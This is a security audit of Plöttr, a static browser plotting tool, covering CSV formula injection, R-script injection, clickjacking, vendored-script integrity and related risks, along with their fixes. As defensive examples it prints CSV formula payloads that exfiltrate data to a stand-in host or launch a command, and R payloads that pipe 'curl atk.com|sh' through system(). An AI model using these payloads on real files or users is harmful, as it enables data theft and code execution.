# Plöttr security audit — 2026-05-02

Honest threat model. Plöttr's deployment shape (browser-only, static, no
server, no auth, no analytics) eliminates entire categories outright —
anything server-side, any session/identity attack, any database
injection. What's left:

---

## Tier A — actually exploitable today

### 1. CSV / Excel formula injection (laundering) — ✅ FIXED in `0ca44c6`

The most realistic attack. Scenario: a colleague (or a public dataset)
hands you a CSV with a cell like `=HYPERLINK("http://atk/x?d="&A1,"Click")`
or the legacy DDE `@SUM(cmd|'/c calc'!A0)`. You open it in Plöttr, do
your analysis, click `⬇ CSV` (or the new `↗ Open in Boxplot` button —
same plumbing), then open the _downloaded_ file in Excel / LibreOffice.
The spreadsheet engine evaluates the formula and exfiltrates / runs
whatever the attacker planted.

Plöttr itself never executes the formula — it just round-trips the cell
as text. But every export path is a laundering vector: `downloadCsv`,
`buildCsvString`, the per-replicate Σ CSV in the new aequorin hand-off,
the calibrated-data CSV in RLU timecourse, the boxplot/scatter/lineplot
CSVs. None of them sanitise leading `=` / `+` / `-` / `@` / tab / `\r` —
the standard OWASP CSV-injection mitigation. **Real attack,
well-documented, and the only one in this list with an
attacker-already-runs-code endgame.**

**Resolution.** Two-layer defence shipped in `0ca44c6`:

1. **Defensive escape on export.** `tools/shared.js`'s `_escapeCsvCell`
   prefixes any cell whose first character is in `[=+\-@\t\r]` with a
   single `'` before the RFC-4180 quote (Excel / LibreOffice / Sheets
   read the leading apostrophe as "treat as text" and silently hide
   it). Every export path inherits the fix because they all flow
   through `buildCsvString`. Crucial scientific-data carve-out: cells
   that parse cleanly as numbers via `isNumericValue` (`-0.5`, `-1.5e3`,
   `-1`, `-0`) bypass the prefix — Excel reads them as numbers, not
   formulas, so prefixing would corrupt every dataset with negatives.
   Hostile leading-minus strings like `-cmd|'/c calc'!A0` or `-2-3+10`
   aren't valid numbers and so still get prefixed.
2. **Proactive ingest scan + warning banner.** `scanForFormulaInjection`
   walks parsed headers + cells at parse time (called from `parseRaw` /
   `parseData` / `parseWideMatrix`); any hits flow through
   `usePlotToolState.injectionWarning` into a new shared
   `FormulaInjectionBanner` rendered by `PlotToolShell`. The banner
   names the offending headers / cells with their position so the user
   can see _where_ the suspicious content is — even if they never
   download the data. Wired into all seven plot tools.

Coverage: 27 cases in `tests/formula-injection.test.js` pin the escape,
the carve-out, the scanner, and the parse-helper plumbing. Demo file:
`docs/security_test_csv_injection.csv`.

### 2. R-script injection via column names — ✅ FIXED in `0ca44c6`

The `# Plöttr — R script export` modules build R source from user data.
`sanitizeRString` escaped `"` and `\` for string literals but the user's
column **identifiers** could land in code positions too (e.g. as object
keys, factor levels, list names). A column named
`"); system("curl atk.com|sh"); foo <- c("` — does `sanitizeRString`
close the cycle, or does the surrounding R-script template assume
identifiers are safe?

The user runs the downloaded script in RStudio, fully trusting it as
their own analysis. If they have R 4.x with default permissions,
`system()` runs arbitrary shell. **High impact if exploitable**,
previously mitigated only by the export tests in `tests/r-export.test.js`.

**Resolution.** Audit pass walked all four `buildRScript*` callers
(`tools/shared-r-export.js`, `tools/boxplot/reports.ts`,
`tools/lineplot.tsx`, `tools/aequorin/reports.ts`,
`tools/heatmap/reports.ts`). Result: column names landing in _quoted_
positions were already safe under `sanitizeRString`, but user-supplied
**set names / x-axis labels** flowed verbatim into `# ...` comment
lines via `dataNote` and the boxplot/lineplot R-script aggregate
banners. `sanitizeRString` also stripped only LF — not CR. R's lexer
treats CR as a statement terminator inside source files, so a name
like `setName = "foo\rsystem('curl evil|sh')"` could break out of a
comment line and run as live R code.

Fix shipped in `0ca44c6`:

1. `sanitizeRString` now strips CR / NEL / U+2028 / U+2029 in addition
   to LF, flattened to a single space (multi-line factor levels are
   almost certainly a paste accident anyway).
2. New `sanitizeRComment` flattens _every_ line terminator with a
   space — used inside `_headerComment` for the `dataNote` block, the
   trailing decision-tree-rationale block, and in
   `tools/boxplot/reports.ts` + `tools/lineplot.tsx` where set names
   and x-axis labels land in `# ...` banner / comment lines.

Coverage: end-to-end regression in `tests/formula-injection.test.js`
asserts a CR-injected `dataNote` payload stays inside the `# ...`
comment, plus dedicated tests for the CR strip and the comment-scrub
helper.

### 3. Hostile-embedder clickjacking

GitHub Pages doesn't let us set HTTP headers, so no `X-Frame-Options` /
`frame-ancestors` CSP. A malicious site can iframe `plottr.bio` (or
`evompmi.github.io/plottr/`) and overlay decoy UI to trick a user into
clicking the wrong button — most plausibly the `↗ Open in Boxplot` or a
download trigger that round-trips attacker-supplied data. Damage ceiling
is "user downloads / re-uploads their own clipboard contents into a
context that lets the attacker observe", since the app holds no remote
secrets.

Fix shape: an inline `<script>` in every HTML head that does
`if (top !== self && new URL(document.referrer).origin !== location.origin) document.body.innerHTML = '<a href="…">Open in a top-level tab</a>'`.
Breaks legitimate iframe embeds (academic notebook, demo blog post). The
`frame-ancestors` CSP in a `<meta http-equiv>` tag is **deliberately
ignored by browsers** — only the HTTP header version works — so the
script-based bust-out is the only option on GitHub Pages.

---

## Tier B — worth tightening, lower impact

### 4. Vendored React without subresource integrity — ✅ FIXED

`vendor/react.production.min.js` and `vendor/react-dom.production.min.js`
shipped as plain `<script src="…">`. A repo compromise (a malicious PR
slipping a mod into the vendor copy, a force-push to `gh-pages`) would
have propagated a backdoored React to every visitor on the next page
load with zero detection.

**Resolution.** Every `<script src="../vendor/react*.production.min.js">`
tag across all 9 `tools/*.html` files now carries
`integrity="sha384-…"` matching the on-disk bytes plus
`crossorigin="anonymous"`. New `scripts/vendor-sri.js` is the source of
truth: it computes the SHA-384 of each canonical vendored file, walks
every tool HTML, and (re-)writes the integrity / crossorigin attributes
in canonical multi-line form (matching prettier's `printWidth: 100`
wrap so `prettier --check` and `--check` mode don't fight each other).
Wired into `prebuild` so any future vendor update regenerates the
hashes automatically; `npm run lint:sri` runs the rewriter in
`--check` mode (added to the CI workflow as the "Verify vendor SRI
hashes" step) so a vendor bump that lands without a hash refresh fails
CI rather than silently shipping a backdoor-permissive build. The
pre-commit hook now also re-runs the rewriter when `vendor/*.js` or the
tool HTMLs are touched. Coverage: 9 cases in `tests/vendor-sri.test.js`
pin the hash format, the rewriter's idempotence (single-line, multi-line,
prettier-wrapped, drifted-hash overwrite, untouched-attribute
preservation, unrelated-script ignore) and the live-repo invariant that
every checked-in `tools/*.html` matches the on-disk vendor bytes.

The same shape would apply to any future vendored MathJax / KaTeX
assets — append the filename to `VENDORED` in `scripts/vendor-sri.js`
and re-run.

### 5. Inline scripts everywhere → no useful CSP possible

Every HTML file has multiple inline `<script>` blocks (theme preloader,
version display, tool registration, theme toggle wiring). A meta-CSP
`script-src 'self'` would break them all; allowing `'unsafe-inline'`
defeats CSP's main value. To get a real CSP, every inline script would
need to move to an external file or carry a `nonce` (impossible for
static deploys, since nonce must be unique per response). Net
assessment: skip CSP for now; it'd be all cost, no security gain on
this deployment shape.

### 6. localStorage cross-tab poisoning

`dataviz-aequorin-prefs`, `dataviz-handoff`, `dataviz-theme` and friends
have no integrity check. If the user has a malicious extension
installed, or another tab on the same origin (which on
`evompmi.github.io` could in principle be another user's GitHub Pages
project), that party can write into Plöttr's keys. `loadAutoPrefs`
validates schema and falls back gracefully on garbage; `consumeHandoff`
validates `tool` field and clears on any mismatch. Practical risk: low.
Worth knowing: `evompmi.github.io` is a project domain shared with every
other repo of yours that ships Pages — those _are_ same-origin and could
in principle write to Plöttr's localStorage. A custom domain
(`plottr.bio`) eliminates this.

### 7. Source-map exposure (`*.js.map` files on gh-pages)

Each compiled tool ships its sourcemap with `sourcesContent` inlined —
full TSX source materialised on the live deploy. Not actually a risk
(the same source is in the public GitHub repo) but worth knowing the
deployed app is fully introspectable; an attacker doesn't need to clone
the repo to read internals.

---

## Tier C — accepted / out of scope

- **Browser extension attacks** — out of model. A malicious extension
  can read all storage, inject scripts, intercept downloads. Plöttr
  can't defend against it.
- **MITM on the user's connection** — GitHub Pages serves over HTTPS
  with HSTS; standard mitigations apply.
- **2 MB ingest cap as a DoS limit** — `FILE_LIMIT_BYTES` already caps
  memory; a 1.9 MB pathological CSV could lock the tab for a few
  seconds, but the impact is limited to the user's own tab. Acceptable.
- **Math.random / Park-Miller LCG** — used only for chart-specific
  reproducibility, never for security. Fine.
- **No password / secret handling** — nothing for an attacker to steal
  from Plöttr itself.

---

## Skilled-and-nasty endgame

The realistic kill chain for a determined attacker who specifically
wants Plöttr users **as the audit found it**:

1. Hosts a "biology-friendly demo dataset" CSV containing
   formula-injection cells **and** column names crafted to escape the
   R-script template.
2. Posts it in a relevant Slack / Twitter / lab-mate email, framed as
   "great example for the Σ-barplot tool".
3. Victim loads in Plöttr, runs analysis, downloads the cleaned CSV →
   opens in Excel → formula fires (#1). OR downloads R script → runs in
   RStudio → `system()` fires (#2).
4. Optional: attacker hosts a clickjacking page (#3) overlaying Plöttr
   to make the wrong "open in" button get clicked, automating the
   round-trip.

**Status after `0ca44c6`.** Steps 3a (Excel formula fire) and 3b
(`system()` fire from a hostile column / set name) are no longer
reachable. CSV laundering is neutralised at the export layer (every
trigger cell is prefixed with `'`) and surfaced to the user at the
import layer (warning banner names the offending cells / headers).
R-script comment escape is closed by `sanitizeRComment` everywhere
user labels land in `# ...` lines, plus the CR strip in
`sanitizeRString`. Step 4 (clickjacking, Tier A #3) is still
open — the remaining Tier A item.

The supply-chain bite (#4 in Tier B, repo / Pages compromise) is a
different kind of attacker and remains the largest residual risk.

If I were prioritising the next fix: **Tier A #3 (clickjacking
bust-out)** is now the only Tier A item left. Roughly ten lines of
inline `<script>` per HTML head, breaks legitimate iframe embeds
(academic notebook / blog demo) — that trade-off is the call to make.
